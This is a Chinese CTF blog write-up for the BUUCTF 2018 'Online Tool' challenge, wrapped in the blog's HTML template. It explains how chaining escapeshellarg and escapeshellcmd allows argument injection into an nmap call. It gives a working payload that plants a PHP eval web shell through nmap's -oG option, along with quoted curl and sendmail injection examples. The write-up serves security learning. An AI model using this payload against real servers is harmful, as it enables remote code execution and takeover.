@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    Ro1ing
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+<meta name="author" content="Ro1i">
+<meta name="description" content="">
+<meta name="keywords" content="CTF">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://Ro1ing.github.io/styles/main.css" />
+<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+        <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+        
+            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic@latest/assets/media/script/APlayer.min.js"></script>
+                    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+                    
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://Ro1ing.github.io">
+                    Ro1ing
+                </a>
+            </div>
+            <div id="tp-weather-widget"></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/">
+                        首页
+                    </a>
+                    
+                    <a class="menu-item" href="/archives">
+                        归档
+                    </a>
+                    
+                    <a class="menu-item" href="/tags">
+                        标签
+                    </a>
+                    
+                    <a class="menu-item" href="/post/about">
+                        关于
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1611989244894" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://Ro1ing.github.io">
+                            Ro1ing
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1611989244894" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="/">
+                            首页
+                        </a>
+                        
+                        <a class="menu-item" href="/archives">
+                            归档
+                        </a>
+                        
+                        <a class="menu-item" href="/tags">
+                            标签
+                        </a>
+                        
+                        <a class="menu-item" href="/post/about">
+                            关于
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                [BUUCTF 2018]Online Tool
+                            </h1>
+                            
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        Ro1ing
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2021-01-30</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">3.2
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">736</a></span>
+                                    
+                                        <span class="post-category">
+                                Category:
+                                
+                                <a href="https://Ro1ing.github.io/tag/XluAwUvyI/">Web</a>
+                                
+                                <a href="https://Ro1ing.github.io/tag/T4AXz5C92/">PHP</a>
+                                
+                                <a href="https://Ro1ing.github.io/tag/V2wZv9aoze/">CTF</a>
+                                
+                            </span>
+                                        
+                                </div>
+                                
+                        </header>
+                        
+                        <div class="post-content">
+                            <p>代码审计php</p>
+<p><strong>escapeshellarg和escapeshellcmd使用不当导致rce</strong></p>
+<p>两个函数配合使用就会导致多个参数的注入。</p>
+<blockquote>
+<p>escapeshellarg和escapeshellcmd的功能</p>
+<p><strong>escapeshellarg</strong></p>
+<p>1.确保用户只传递一个参数给命令<br>
+2.用户不能指定更多的参数一个<br>
+3.用户不能执行不同的命令</p>
+<p><strong>escapeshellcmd</strong></p>
+<p>1.确保用户只执行一个命令<br>
+2.用户可以指定不限数量的参数<br>
+3.用户不能执行不同的命令</p>
+</blockquote>
+<p>关于escapeshellarg和escapeshellcmd使用不当导致rce</p>
+<p>在https://paper.seebug.org/164/有详解</p>
+<p>我们在这摘取</p>
+<blockquote>
+<ol>
+<li>传入的参数是：172.17.0.2' -v -d a=1</li>
+<li>经过escapeshellarg处理后变成了'172.17.0.2''' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
+<li>经过escapeshellcmd处理后变成'172.17.0.2'\'' -v -d a=1'，这是因为escapeshellcmd对\以及最后那个<strong>不配对儿</strong>的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</li>
+<li>最后执行的命令是curl '172.17.0.2'\'' -v -d a=1'，由于中间的\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d     a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。</li>
+</ol>
+<p>回到mail中，我们的 payload 最终在执行时变成了'-fa'\''( -OQueueDirectory=/tmp -X/var/www/html/test.php )@a.com'，分割后就是-fa(、-OQueueDirectory=/tmp、-X/var/www/html/test.php、)@a.com'，最终的参数就是这样被注入的。</p>
+<p>使用escapeshellcmd / escapeshellarg时不可能执行第二个命令。</p>
+<p>但是我们仍然可以将参数传递给第一个命令。</p>
+<p>这意味着我们也可以将新选项传递给命令。</p>
+<p>利用漏洞的能力取决于目标可执行文件。</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+
+if(!isset($_GET['host'])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET['host'];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    $sandbox = md5(&quot;glzjin&quot;. $_SERVER['REMOTE_ADDR']);
+    echo 'you are in sandbox '.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
+}&gt; 
+</code></pre>
+<blockquote>
+<p>HTTP_X_FORWARDED_FOR获取到的IP地址</p>
+<p>REMOTE_ADDR代表着客户端的IP</p>
+<p>这两个都为比较常见的服务器获取ip</p>
+</blockquote>
+<blockquote>
+<p>echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
+</blockquote>
+<p>这有个system来执行命令有传参。</p>
+<p>本意是要输入ip参数来进行扫描，我们可以利用两个函数的漏洞，来过滤。</p>
+<p><strong>-oG</strong>可以实现将命令和结果写到文件</p>
+<p>payload可以通过写一个Shell到文件中</p>
+<p>由此构造payload：</p>
+<blockquote>
+<p>'<?php @eval($_POST["hack"]); ?> -oG hack.php '</p>
+</blockquote>
+<p>转化为：</p>
+<blockquote>
+<p>''[\''&lt;?php](file://''/ @eval($_POST[&quot;hack&quot;]); ?&gt; -oG hack.php '\'''</p>
+</blockquote>
+<p>输出为：</p>
+<blockquote>
+<p>&lt;?php @eval($_POST[hack]); ?&gt; -oG hack.php \</p>
+</blockquote>
+<p>菜刀连接即可</p>
+<p>参考链接：</p>
+<p>http://lz2y.top/index.php/2020/03/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-buuctf-2018online-tool/</p>
+<p>https://note.redmango.top/Online%20Tool(BUUCTF%202018)/</p>
+<p>https://paper.seebug.org/164/</p>
+<p>https://blog.csdn.net/qq_26406447/article/details/100711933</p>
+<p>https://blog.csdn.net/weixin_44077544/article/details/102835099</p>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                
+                            </div>
+                            
+                                
+                                    
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>Ro1ing</span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://Ro1ing.github.io/post/buuctf-2018online-tool/">https://Ro1ing.github.io/post/buuctf-2018online-tool/</a></span>
+                                            </p>
+
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
+                                        
+                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://Ro1ing.github.io/post/buuctf-2018online-tool/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://Ro1ing.github.io/post/buuctf-2018online-tool/&sharesource=qzone&title=[BUUCTF 2018]Online Tool&pics=https://Ro1ing.github.io/images/avatar.png?v=1611989244894&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://Ro1ing.github.io/post/buuctf-2018online-tool/&sharesource=weibo&title=[BUUCTF 2018]Online Tool + " - " + &pic="https://Ro1ing.github.io/images/avatar.png?v=1611989244894 "><i class="fa fa-weibo "></i></a>
+                                                        
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                        
+                        <a href="https://Ro1ing.github.io/tag/XluAwUvyI/">#
+                                                Web
+                                                    </a>
+                                                    
+                        <a href="https://Ro1ing.github.io/tag/T4AXz5C92/">#
+                                                PHP
+                                                    </a>
+                                                    
+                        <a href="https://Ro1ing.github.io/tag/V2wZv9aoze/">#
+                                                CTF
+                                                    </a>
+                                                    
+                                                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
+                                                                
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://Ro1ing.github.io/post/bjdctf2020za-xiang-misc/">
+                                                                                            [BJDCTF2020]杂项Misc
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://Ro1ing.github.io/post/buuctfmisc-ji-chu/">
+                                                                                                    BUUCTFMisc基础
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+    <div id="player"></div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+                            
+                                <b id="hitokoto"></b><br>
+                                
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                        Ro1ing &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://coding.net" target="_blank">
+                                                Coding.net
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.6
+                </div>
+                
+                    <script>
+                        var port = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + port + '</div>')
+                    </script>
+        </footer>
+        
+                <script>
+                    
+
+                    function LoadPlayer() {
+                        var musicList = [];
+                        
+                        musicList.push({
+                            name: 'you don&#39;t know me anymore',
+                            url: 'http://music.163.com/song/media/outer/url?id=525239836',
+                            artist: 'Guardin',
+                            cover: '',
+                        });
+                        
+                        console.log(" MusicList: " + musicList);
+                        
+                        const ap = new APlayer({
+                            container: document.getElementById('player'),
+                            fixed: true,
+                            audio: musicList
+                        });
+                        
+                    }
+                    LoadPlayer();
+                    
+                    
+                    
+                    hitokoto();
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1611989244894);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
